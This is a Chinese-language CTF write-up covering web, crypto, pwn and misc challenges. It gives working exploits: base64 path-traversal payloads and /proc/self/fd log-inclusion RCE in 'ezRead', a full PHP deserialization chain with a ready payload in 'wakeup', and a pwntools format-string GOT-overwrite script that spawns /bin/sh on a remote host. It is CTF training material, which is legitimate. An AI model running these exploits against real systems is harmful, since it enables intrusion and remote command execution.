0x01 WEB
========

ezRead
------

题目一点进去就是一个url：`/read.php?Book=ZGRsLnR4dA==`  
猜测有任意文件读取，经过一番尝试，从报错中发现过滤了`../`，一开始没有立即想到是`str_replace`，经过队友的提示，我尝试复写`../`，果然成功绕过，通过`/var/www/ctf/read.php`可以读取到`read.php`的源代码：

```php
..././..././..././..././..././..././..././..././..././var/www/ctf/read.php
base64:Li4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vdmFyL3d3dy9jdGYvcmVhZC5waHA=
read.php?Book=Li4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vdmFyL3d3dy9jdGYvcmVhZC5waHA=

```

读取到的read.php如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-63cf44ca55888050af9434a9da8af2a5f4a8564a.png)

发现果然是`str_replace`，并且有任意文件读取，尝试读取根目录是否有/flag，然而并没有那么简单，很明显是需要通过其他方式来继续getshell。经过多番努力尝试，搜寻无果。  
我们知道，在linux下一切皆文件，所有，线索肯定藏在某个地方，从`/etc/password`我们可以知道有一个`/home/ctf`目录，对该目录进行文件爆破，最终读取到有`.bash_history`，很明显是bash命令操作历史：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-77d448c396d4fc21352b6b571a0e16842f345069.png)

从命令操作历史来看，应该是存在一个`V72J1dn23wjFrq`的目录的，所以我们去尝试访问，最终发现有存在一个`demo.php`，重大发现，于是去`read.php`开始去读源码：

```php
..././..././..././..././..././..././..././..././..././var/www/ctf/V72J1dn23wjFrq/demo.php
Li4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vdmFyL3d3dy9jdGYvVjcySjFkbjIzd2pGcnEvZGVtby5waHA=
read.php?Book=Li4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vLi4uLy4vdmFyL3d3dy9jdGYvVjcySjFkbjIzd2pGcnEvZGVtby5waHA=
```

`demo.php`源码如下:

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-e3033583f850e8ae9dc313a54a16ca7eec6e555e.png)

很明显的任意文件包含，于是去尝试常见的日志文件包含：

```php
日志文件
nginx
/var/log/nginx/access.log
apache2：
/var/log/apache2/access.log
apache
/var/log/httpd/access_log
```

最终尝试无果，突然想到了前几天看到的一个php-LFI-trick：[\# 『CTF Tricks』PHP-妙用/proc/self/fd触发LFI日志包含完成RCE命令执行（\[羊城杯 2021\]Only 4非预期解）](https://blog.csdn.net/Xxy605/article/details/120250984)  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-a7d4b498b6582157597e85b9d6ad137ea6c3af5f.png)

一试没想到还真有指向**日志的文件描述符**，这个trick使用的环境非常狭窄，没想到还真能遇到，运气不错。  
接下来就是往`read.php`的`user-agent`写入一个一句话：  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-9880ecb33ac9e3c149650f0aa8de6aaa7dd6e488.png)

然后去`demo.php`包含`/proc/self/fd/8`完成RCE，令人感叹的是，这个flag藏得真厉害，不过最后还是在/home/ctf目录下找到了一个txt文件，flag就在里面：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-78fa98785387008202dc14bd5234df4918887c44.png)

wakeup
------

### 写在前面

这题就是一道纯纯的反序列化链子题，但是考的点是利用引用赋值绕过，也是我第一次接触的印象较为深刻的链子，感觉是十分奇妙，一个return用到了如此地步，不得让人感叹，还是需要多多潜心学习！

### 漏洞源码

```php
<?php

class KeyPort {

    public function __call($name, $arguments)
    {
        if(!isset($this->wakeup)||!$this->wakeup){
            call_user_func_array($this->format[$name],$arguments);
        }
    }

    public function finish(){
        $this->format=array();
        return $this->finish->iffinish;
    }

    public function __wakeup(){
        $this->wakeup=True;
    }
}

class ArrayObj{

    private $iffinish;
    public $name;

    public function __get($name){
        return $this->$name=$this->name[$name];
    }
}

class SunCorpa {
    public function __destruct()
    {
        if ($this->process->finish()) {
            $this->process->forward($this->_forward);
        }
    }
}

class MoonCorpa {
    public function __destruct()
    {
        if ($this->process->finish()) {
            $this->options['new']->forward($this->_forward);
        }
    }
    public function __wakeup(){
    }
}

if($_GET['u']){
    unserialize(base64_decode($_GET['u']));
}else{
    highlight_file(__FILE__);
} 
```

### 前置知识

1、**\_\_destruct**：一个类如果属性中有对象类型，先执行该类对象的析构函数，再执行属性中类对象的析构函数。即先执行外层，再执行内层。

2、**\_\_wakeup**：这个则与\_\_destruct函数相反，先执行属性中类对象的wakeup函数，在调用自身类对象的wakeup函数。即先执行内层，再执行外层。

3、**php引用赋值&amp;**：php可以使用引用的方式，使两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。

4、**\_\_get**：当类的成员属性是private，在类外部调用该属性就会调用\_\_get方法；访问不存在的成员属性也会调用\_\_get；

5、**\_\_call**：当试着调用一个对象中不存在的方法或者在外调用不是public的方法，就是触发\_\_call方法。  
6、**引用的方式**：  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-0d81b8d8ba2a096aa80021797bd78459cdf80957.png)

### 过程分析

看完所有的类，明白的都知道最后都是要去调用`KeyPort::__call`下的`call_user_func_array`，然而一个wakeup就可以把这条路堵得严严实实的，因为wakeup需要不存在或者为false才能进入该函数进行命令执行，然后`__wakeup`的时候就将wakeup置为true了：  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-ec0773561f314b03576e7e06eb93deeed96ff113.png)

所以，就需要用到引用赋值绕过这一个神奇的方法了。**思路如下**：

**由于在类外面进行各种类的实例化和赋值存在些离散和复杂的操作，因此，我们选择一个入口类来存储我们所有需要序列化的类对象。入口类肯定是在有着\_\_destruct函数的两个类中选了，我们选择SunCorpa这个入口类。**

1、**第一部分**，使用引用赋值将key1的wakeup赋值为false：

```php
我来解释一下第一部分，主要的要点就是通过ArrayObj的private属性iffinish触发\_\_get间接使被引用的wakeup为false

首先是SunCorpa最外层的类对象开始析构，this->process被赋值为KeyPort类的一个对象，调用它的finish函数；

最重要的是这一句return this->finish->iffinish；

由于this->finish被赋值为ArrayObj,并且KeyPort的wakeup被ArrayObj的iffinish引用，

所以相当于KeyPort->wakeup=ArrayObj->iffinish=\_\_get(iffinish)=ArrayObj\['iffinish'\]

最终，wakeup被赋值为false。

最重要要理解的就是，那一段return直接触发get赋值的神奇调用了。

第一部分结束，$this->key->wakeup被赋值为false
```

2、**第二部分**，因为在执行KetPort::finish()时，其format会被赋值为空数组，导致无法执行我们想要的函数，所以使用引用的方法来给format赋值：

```php
同样是，第二部分我来解释一下，其实跟第一部分大同小异，只要理解了第一部分，那么第二部分就不难理解了。

由于每次进入KetPort::finish函数时，就会是format被赋值为空数组，无法传递命令执行的参数，所以这里我们也可以使用引用赋值绕过。

这里同第一部分一致，仅是将被引用对象属性由wakeup换为了format；但是有个需要特别注意的地方，这里引用的仍是第一部分的format

同时，由于需要调用到call方法，所以这里的MoonCorpa类对象中的options\['new'\]需要使用上面第一部分绕过wakeup构造好的KeyPort。

最后，填入对应的需要调用的函数方法和参数即可命令执行。
```

**注意：为什么在类里面实例化了一个对象new obj之后，还需要自己声明一个变量来存储这个实例化对象，因为你不存储在这个类里面，到时序列化时，就不会把这个实例化对象一起实例化了，链子就会断掉。  
最好实例化完该类之后，就一直使用this-&gt;obj进行赋值，这样不容易掉链子。**

### 最终exp&amp;payload

exp

```php
<?php

class KeyPort {

}

class ArrayObj{
    private $iffinish;
    public $name;
    public function __construct(&$x)
    {
        $this->iffinish=&$x;
    }
}

class SunCorpa {
    public function __construct(){
        //第一部分，使用引用赋值将key1的wakeup赋值为false
        $key1=new KeyPort();
        $this->key1=$key1;
        $arr1=new ArrayObj($key1->wakeup);
        $arr1->name=array("iffinish"=>false);
        $key1->finish=$arr1;
        $this->process=$key1;

        //第二部分，同样使用引用赋值使format可控，同时引用第一部分创造好的call入口，即可达到RCE
        $moon=new MoonCorpa();
        $this->moon=$moon;
        $this->moon->options=array("new"=>$this->key1);
        $this->moon->_forward="calc";
        $key2=new KeyPort();
        $this->key2=$key2;
        $arr2=new ArrayObj($this->key1->format);
        $this->arr2=$arr2;
        $this->arr2->name=array("iffinish"=>array("forward"=>"system"));
        $this->key2->finish=$this->arr2;
        $this->moon->process=$this->key2;

    }
}

class MoonCorpa {

}
$sun=new SunCorpa();
$ser=base64_encode(serialize($sun));
echo $ser."\n";
```

payload

```php
Tzo4OiJTdW5Db3JwYSI6NTp7czo0OiJrZXkxIjtPOjc6IktleVBvcnQiOjM6e3M6Njoid2FrZXVwIjtOO3M6NjoiZmluaXNoIjtPOjg6IkFycmF5T2JqIjoyOntzOjE4OiIAQXJyYXlPYmoAaWZmaW5pc2giO1I6MztzOjQ6Im5hbWUiO2E6MTp7czo4OiJpZmZpbmlzaCI7YjowO319czo2OiJmb3JtYXQiO047fXM6NzoicHJvY2VzcyI7cjoyO3M6NDoibW9vbiI7Tzo5OiJNb29uQ29ycGEiOjM6e3M6Nzoib3B0aW9ucyI7YToxOntzOjM6Im5ldyI7cjoyO31zOjg6Il9mb3J3YXJkIjtzOjQ6ImNhbGMiO3M6NzoicHJvY2VzcyI7Tzo3OiJLZXlQb3J0IjoxOntzOjY6ImZpbmlzaCI7Tzo4OiJBcnJheU9iaiI6Mjp7czoxODoiAEFycmF5T2JqAGlmZmluaXNoIjtSOjc7czo0OiJuYW1lIjthOjE6e3M6ODoiaWZmaW5pc2giO2E6MTp7czo3OiJmb3J3YXJkIjtzOjY6InN5c3RlbSI7fX19fX1zOjQ6ImtleTIiO3I6MTM7czo0OiJhcnIyIjtyOjE0O30
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-a8a3f4e6e27ab901c11cb68091475957265ae71a.png)  
弹出计算器啦，完结撒花！

0x02 Crypto
===========

cry1
----

### 源码

```php
from Crypto.Util.number import \*  
from gmpy2 import \*  
from random import \*  
from flag import flag  

m = bytes\_to\_long(flag)  

while True:  
    try:  
        p = getPrime(512)  
        q = next\_prime(p+2\*\*420)  
        n = p\*q  
        phi = (p-1)\*(q-1)  
        d = randint(0,n\*\*0.32)  
        e = inverse(d,phi)  
        c = pow(m,e,n)  
        break  
    except:  
        continue  

print("e = %d"%e)  
print("n = %d"%n)  
print("c = %d"%c)  

'''  
e = 101684733522589049376051051576215902510166244234370429058800153902445053536138419222096346715560283781778705047246555278271919928248836576236044123786248907522717751222608113597458768397652361813688176017155353220911686089871315647328303370846954697334521948003485878793121446614220897034652783771882675756065  
n = 106490064297459077911162044548396107234298314288687868971249318200714506925762583340058042587392504450330878677254698499363515259785914237880057943786202091010532603853142050802310895234445611880617572636397946757345480447391544962796834842717321639098108976593541239044249391398321435940436125823407760564233  
c = 92367575354201067679929326801477992215675304496512806779109227230237905402825022908214026985431756172011616861246881703226244396008088878308925377019775353026444957454196182919500667632574210469783704454438904889268692709062013797002819384105191802781841741128273810101308641357704215204494382259638905571144  
'''
```

### 分析

很明显，可以直接进行爆破，爆破的脚本如下所示：

```php
from random import *

from Crypto.Util.number import *
from gmpy2 import *

e = 101684733522589049376051051576215902510166244234370429058800153902445053536138419222096346715560283781778705047246555278271919928248836576236044123786248907522717751222608113597458768397652361813688176017155353220911686089871315647328303370846954697334521948003485878793121446614220897034652783771882675756065
n = 106490064297459077911162044548396107234298314288687868971249318200714506925762583340058042587392504450330878677254698499363515259785914237880057943786202091010532603853142050802310895234445611880617572636397946757345480447391544962796834842717321639098108976593541239044249391398321435940436125823407760564233
c = 92367575354201067679929326801477992215675304496512806779109227230237905402825022908214026985431756172011616861246881703226244396008088878308925377019775353026444957454196182919500667632574210469783704454438904889268692709062013797002819384105191802781841741128273810101308641357704215204494382259638905571144

for i  in range(1,999999):
    att=2**420+i
    if iroot(att**2+4*n,2)[1]:
        ppp=(iroot(att**2+4*n,2)[0])
        p=(ppp-att)//2
        q=n//p
        d=inverse(e,(p-1)*(q-1))
        m=pow(c,d,n)
        print(long_to_bytes(m))

```

cry2
----

### 源码

```php

from Crypto.Util.number import \*  
\# from secret import p,q,e,flag  

i = 11  
j = 2  
n = p\*q  
phi = (p-1)\*(q-1)  
d = inverse(e,phi)  

assert i\*p-j\*q < n\*\*0.342  

m = bytes\_to\_long(flag)  
c = pow(m,e,n)  
print("n = %d"%n)  
print("e = %d"%e)  
print("c = %d"%c)  

'''  
n = 45644374572906696918751526371540317432552767574531146725947197073091284249824311652929876880761183040024642912502639494246699284890420348711755152172125722304276541146638287085067604879135037538874624825231963426170448359129554061563687341132377272549120305441316002675552272436786866637426883885955669  
e = 41481590714555165448395765336905824124002290841668481529563451625379681482568747653473952507567741287320305714776744069287119560788311144707988486438017581271859974139810844158857833808782692691546769253874942787868189158458052798618813933937987400708792117152522747046613196233766095230599127585735387  
c = 22481406077490349765775034449449891800947708922075545785612755725758022203729757284410090404594184343037857329687684264861065063318192985875299797350095483009028047907100198078442807473361406623372312757028192244866488285737647764514477453697952539702007946700121592003883339948335465611926065239772772  

'''
```

### 分析

有明显的特征：0.342，知道是 `rsa Generalized Wiener Attack "0.342"`  
直接google搜索，下载paper，发现有现成的p可以测试，一试发现就是出题人用的就是这个p，所以直接拿那个p去算就可以拿到flag了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-fef469889596d6264378097603a0ad102d1c0d32.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-6aace2895e17f286b30b9aee34f07ed5972e5335.png)  
exp

```php
from Crypto.Util.number import *

p=2880794542322299126706444345451054566788591299326109649598593295363377126011666800246753142436062672739058788177830266655144151568857625404801769045849
n = 45644374572906696918751526371540317432552767574531146725947197073091284249824311652929876880761183040024642912502639494246699284890420348711755152172125722304276541146638287085067604879135037538874624825231963426170448359129554061563687341132377272549120305441316002675552272436786866637426883885955669
e = 41481590714555165448395765336905824124002290841668481529563451625379681482568747653473952507567741287320305714776744069287119560788311144707988486438017581271859974139810844158857833808782692691546769253874942787868189158458052798618813933937987400708792117152522747046613196233766095230599127585735387
c = 22481406077490349765775034449449891800947708922075545785612755725758022203729757284410090404594184343037857329687684264861065063318192985875299797350095483009028047907100198078442807473361406623372312757028192244866488285737647764514477453697952539702007946700121592003883339948335465611926065239772772

print(long_to_bytes(pow(c,inverse(e,p-1), p)))

```

cry3
----

### 分析

分析题目可知， 是一个DH密钥交换协议。  
参数是  
`g = 916143391925527262831875920931`  
`p=11629419588729710248789180926208072549658261770997088964503843186890228609814366773219056811420217048972200345700258846936553626057834496`  
其中`p = 2^425`。在这样p下面离散对数问题是很简单的。  
看到输出，发现前面都是固定的格式：  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-adc319e8347ca0b9e05b4a633e5da86cdf5c23eb.png)

我们直接将后面的东西提取出来：  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-896cffb7d4eb537de07253e04faead4e07d15a4a.png)

去掉空格，十六进制解码，发现是一个十六进制的长整型数，是python2用的。所以这个应该是Alice传的A，拿去解离散对数：  
得到`a=834271009007676372630844596581`  
同理我们可以拿到B：  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-4f895705800610ad195331667112858053134354.png)  
`b=1250126455332688858891056975419`

然后我们根据代码计算协商密钥

```php
from Crypto.Cipher import AES
from hashlib import sha256
share = pow(A,b,p)
sharekey =  sha256(str(share).encode()).hexdigest()\[:16\]
```

然后去解密消息，Flag的密文应该是Alice传给Bob的

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-37414dcfbf1af6ece17eafe37651bff3081a1ebc.png)

应该是 02 后面的值,拿下来解码,然后根据代码用AES解密

```php
aes = AES.new(sharekey.encode(),AES.MODE\_ECB)
aes.decrypt(cipher)
```

0x03 PWN
========

究极输出
----

### 漏洞分析

`while`循环内不断的调用`printf(buf)`的格式化字符串漏洞。  
一开始调试输入了很多的%p，发现偏移3的位置`（%3$p）`可以leak出libc的地址。  
由于buf在bss段上，我们考虑在栈上布置printf的got表，利用栈上的链表写入got表，然后再利用栈上的got表，修改printf的got表为system函数的地址，之后`printf(buf)`，输入buf为`/bin/sh`即调用`sysem("/bin/sh")`

### exp

```php
from os import system
from signal import pause
from pwn import *
from LibcSearcher import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

mode = 0
if mode == 1:
    fang = process("./pwn")  
else:
    fang = remote("39.105.99.40",34230)

def debug():
    gdb.attach(fang)
    pause()

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
printf_got = elf.got['printf'] # 0x403390

# gdb.attach(fang,"b *0x4011C7")
# pause()

fang.recvuntil("HELLO?PWN IT!!!\n")
fang.sendline("%3$p")

libc_addr = int(fang.recv(14),16)
libc_base = libc_addr - 0xf7360
system_addr = libc_base + libc.symbols['system']

log.info("printf_got : 0x%x" % printf_got)
log.info("libc_base : 0x%x" % libc_base)
log.info("system_addr : 0x%x" % system_addr)

payload = "%13200c%6$hn"
fang.recvuntil("HELLO?PWN IT!!!\n")
fang.sendline(payload)
sleep(1)

payload = "%4207505c%17$n"
fang.recvuntil("HELLO?PWN IT!!!\n")
fang.sendline(payload)
sleep(1)

system_addr_low  = system_addr & 0xff
system_addr_high = (system_addr>>8) & 0xffff

payload = "%"+ str(system_addr_low) +"c%8$hhn" + "%" + str(system_addr_high - system_addr_low) + "c%36$hn"
fang.recvuntil("HELLO?PWN IT!!!\n")
fang.sendline(payload)
sleep(1)

payload = "/bin/sh\x00"
fang.recvuntil("HELLO?PWN IT!!!\n")
fang.sendline(payload)

fang.interactive()
```

0X04 MISC
=========

签了个到
----

玩羊了个羊游戏，一直狂点消灭，玩完就可以拿flag了  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-106a9a6bd832d7f38a460bb4543e18e47e6dfafb.png)